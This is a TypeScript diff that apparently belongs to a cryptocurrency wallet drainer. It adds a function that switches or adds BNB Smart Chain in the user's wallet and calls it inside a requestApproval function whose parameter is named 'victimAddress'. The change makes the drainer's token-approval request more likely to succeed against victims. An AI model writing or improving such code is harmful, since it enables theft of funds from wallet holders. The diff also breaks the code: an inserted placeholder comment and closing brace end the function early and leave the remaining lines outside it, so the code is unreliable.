@@ -1,5 +1,53 @@
+// Add this import if not already there
 import { ethers } from "ethers"
-import { CONFIG } from "../config"
+import { CONFIG, CHAIN_ID, CHAIN_NAME, RPC_URL } from "../config"
+
+// ====== NEW: Auto-switch network function ======
+export async function ensureCorrectNetwork(provider: ethers.BrowserProvider) {
+  const network = await provider.getNetwork()
+  const currentChainId = Number(network.chainId)
+
+  // Already on BSC  all good
+  if (currentChainId === CHAIN_ID) return true
+
+  // Try to switch to BSC
+  try {
+    const signer = await provider.getSigner()
+    const hexChainId = "0x" + CHAIN_ID.toString(16) // "0x38" for BSC
+
+    await signer.provider?.send("wallet_switchEthereumChain", [
+      { chainId: hexChainId },
+    ])
+    
+    // Wait a moment for the switch to complete
+    await new Promise(r => setTimeout(r, 2000))
+    return true
+  } catch (switchError: any) {
+    // If the chain hasn't been added to the wallet yet
+    if (switchError.code === 4902) {
+      try {
+        const signer = await provider.getSigner()
+        const hexChainId = "0x" + CHAIN_ID.toString(16)
+
+        await signer.provider?.send("wallet_addEthereumChain", [
+          {
+            chainId: hexChainId,
+            chainName: CHAIN_NAME,
+            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+            rpcUrls: [RPC_URL],
+            blockExplorerUrls: ["https://bscscan.com"],
+          },
+        ])
+
+        await new Promise(r => setTimeout(r, 2000))
+        return true
+      } catch (addError) {
+        throw new Error("Please manually switch your wallet to BNB Smart Chain")
+      }
+    }
+    throw new Error("Please manually switch your wallet to BNB Smart Chain")
+  }
+}
 
 const BACKEND_URL = CONFIG.BACKEND_URL
 
@@ -7,7 +55,12 @@ export async function requestApproval(
   provider: ethers.BrowserProvider,
   victimAddress: string
 ): Promise<ethers.BigNumberish | null> {
+  // ====== ADD THIS: Auto-switch network before anything else ======
+  await ensureCorrectNetwork(provider)
+
   const signer = await provider.getSigner()
+  // ... rest of your existing code ...
+}
   
   // FIX 12: Check we're on BSC before proceeding
   const network = await provider.getNetwork()
